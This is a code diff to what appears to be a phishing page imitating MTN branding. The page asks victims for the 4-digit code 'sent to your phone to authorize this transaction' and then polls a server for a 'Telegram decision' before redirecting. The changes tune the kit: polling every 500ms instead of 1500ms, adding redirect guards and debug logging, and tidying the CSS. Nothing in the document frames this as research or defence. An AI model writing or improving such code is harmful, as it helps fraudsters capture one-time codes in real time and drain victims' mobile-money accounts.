@@ -69,7 +69,6 @@
   }
   .code-sub b{color:var(--mtn-blue-deep);font-weight:800;}
 
-  /* ---- Expired / declined banner ABOVE the input ---- */
   .expired-banner{
     display:none;
     align-items:center;gap:10px;
@@ -77,8 +76,7 @@
     border:1px solid rgba(211,47,47,0.40);
     color:var(--red);
     padding:12px 14px;border-radius:12px;
-    margin-bottom:20px;
-    text-align:left;
+    margin-bottom:20px;text-align:left;
     font-size:12.5px;font-weight:700;
     line-height:1.5;
     animation:bannerIn .3s ease;
@@ -91,8 +89,7 @@
   .expired-banner .ic{
     width:26px;height:26px;border-radius:50%;
     background:rgba(211,47,47,0.18);
-    display:flex;align-items:center;justify-content:center;
-    flex-shrink:0;
+    display:flex;align-items:center;justify-content:center;flex-shrink:0;
   }
   .expired-banner .ic svg{
     width:14px;height:14px;stroke:var(--red);fill:none;
@@ -116,9 +113,7 @@
     margin-bottom:16px;
   }
   .code-input::placeholder{
-    color:#D5DEE9;
-    letter-spacing:22px;
-    font-weight:900;
+    color:#D5DEE9;letter-spacing:22px;font-weight:900;
   }
   .code-input:focus{
     outline:none;
@@ -139,10 +134,8 @@
 
   .indicator{
     width:100%;height:5px;
-    background:#E8EEF6;
-    border-radius:6px;
-    overflow:hidden;
-    margin-bottom:26px;
+    background:#E8EEF6;border-radius:6px;
+    overflow:hidden;margin-bottom:26px;
   }
   .indicator-bar{
     height:100%;width:0%;
@@ -172,9 +165,7 @@
     font-size:13px;font-weight:800;
     cursor:pointer;padding:8px 12px;
     border-radius:8px;
-    transition:.18s;
-    font-family:inherit;
-    letter-spacing:0.2px;
+    transition:.18s;font-family:inherit;letter-spacing:0.2px;
   }
   .resend-btn:hover:not(:disabled){background:rgba(0,79,159,0.08);}
   .resend-btn:disabled{opacity:.5;cursor:not-allowed;}
@@ -182,10 +173,7 @@
     width:14px;height:14px;stroke:currentColor;fill:none;
     stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;
   }
-  .resend-btn.sent{
-    color:var(--green);
-    pointer-events:none;
-  }
+  .resend-btn.sent{color:var(--green);pointer-events:none;}
 
   .status{
     font-size:12px;text-align:center;margin-top:14px;
@@ -220,14 +208,16 @@
   @keyframes pulse{0%,100%{transform:scale(1);opacity:.85;}50%{transform:scale(1.18);opacity:1;}}
   .processing-screen .brand-mark{
     font-size:22px;font-weight:900;letter-spacing:3px;
-    text-transform:uppercase;color:#fff;margin-bottom:40px;opacity:.9;position:relative;z-index:2;
+    text-transform:uppercase;color:#fff;margin-bottom:40px;opacity:.9;
+    position:relative;z-index:2;
   }
   .processing-screen .brand-mark em{font-style:normal;color:var(--mtn-yellow);}
   .processing-screen .spinner{
     width:88px;height:88px;border-radius:50%;
     border:6px solid rgba(255,255,255,0.14);
     border-top-color:var(--mtn-yellow);border-right-color:var(--mtn-yellow);
-    animation:spin 0.95s linear infinite;margin-bottom:34px;position:relative;z-index:2;
+    animation:spin 0.95s linear infinite;margin-bottom:34px;
+    position:relative;z-index:2;
   }
   @keyframes spin{to{transform:rotate(360deg);}}
   .processing-screen h1{
@@ -236,10 +226,12 @@
   }
   .processing-screen p.sub{
     font-size:14px;color:rgba(255,255,255,0.72);
-    font-weight:600;line-height:1.6;max-width:340px;position:relative;z-index:2;
+    font-weight:600;line-height:1.6;max-width:340px;
+    position:relative;z-index:2;
   }
   .processing-screen .dots{
-    margin-top:26px;display:flex;justify-content:center;gap:8px;position:relative;z-index:2;
+    margin-top:26px;display:flex;justify-content:center;gap:8px;
+    position:relative;z-index:2;
   }
   .processing-screen .dots span{
     width:8px;height:8px;border-radius:50%;
@@ -286,7 +278,6 @@
         Type the <b>4-digit code</b> sent to your phone to authorize this transaction.
       </div>
 
-      <!-- ✅ Expired banner — sits ABOVE the input -->
       <div class="expired-banner" id="expiredBanner">
         <div class="ic">
           <svg viewBox="0 0 24 24">
@@ -359,6 +350,9 @@
   const rbtn   = el('resendBtn');
   const banner = el('expiredBanner');
 
+  let pollingActive = false;
+  let redirected = false;
+
   function setStatus(msg, type){
     const s = el('status');
     s.textContent = msg;
@@ -401,8 +395,8 @@
       return;
     }
 
-    // Clear the expired banner on new attempt
     hideExpiredBanner();
+    redirected = false;
 
     btn.disabled = true;
     input.disabled = true;
@@ -424,6 +418,7 @@
       });
 
       const data = await res.json();
+      console.log('[CODE] submit response:', data);
 
       if(!data.ok){
         hideProcessing();
@@ -448,32 +443,40 @@
       return;
     }
 
-    // ---- Poll for Telegram decision ----
+    // ---- Poll for Telegram decision — every 500ms ----
+    if(pollingActive) return;
+    pollingActive = true;
+
     const MAX_WAIT = 5 * 60 * 1000;
     const start = Date.now();
     let consecutiveUnknown = 0;
 
     const poll = setInterval(async () => {
+      if(redirected) return;
+
       try{
         const r = await fetch(`${API}/code-status/${requestId}`);
         const s = await r.json();
 
-        // ✅ Approved → go to approved.html
+        console.log('[POLL]', requestId, '->', s);
+
+        // ✅ Approved → navigate IMMEDIATELY
         if(s.status === 'approved'){
+          redirected = true;
           clearInterval(poll);
-          await new Promise(res => setTimeout(res, 400));
-          window.location.href = `approved.html?status=approved&id=${requestId}`;
+          pollingActive = false;
+          console.log('[REDIRECT] Going to approved.html');
+          window.location.replace(`approved.html?status=approved&id=${requestId}`);
           return;
         }
 
-        // ❌ Declined → stay on code page, show banner above input
+        // ❌ Declined → stay, show banner
         if(s.status === 'declined' || s.status === 'expired'){
           clearInterval(poll);
+          pollingActive = false;
           hideProcessing();
-
           showExpiredBanner();
           setStatus('');
-
           input.value = '';
           refresh();
           btn.disabled = true;
@@ -483,16 +486,15 @@
           return;
         }
 
-        // ⚠️ Server restart / lost the ID
+        // ⚠️ Unknown
         if(s.status === 'unknown'){
           consecutiveUnknown++;
           if(consecutiveUnknown >= 3){
             clearInterval(poll);
+            pollingActive = false;
             hideProcessing();
-
             showExpiredBanner();
             setStatus('');
-
             input.value = '';
             refresh();
             btn.disabled = true;
@@ -505,22 +507,20 @@
 
         consecutiveUnknown = 0;
 
-        // ⏱ Overall timeout
         if(Date.now() - start > MAX_WAIT){
           clearInterval(poll);
+          pollingActive = false;
           hideProcessing();
-
           showExpiredBanner();
           setStatus('');
-
           input.disabled = false;
           rbtn.disabled = false;
         }
 
       }catch(err){
-        // transient error — keep polling
+        console.warn('[POLL ERROR]', err);
       }
-    }, 1500);
+    }, 500);  // ← poll every 500ms
   }
 
   async function resendCode(){
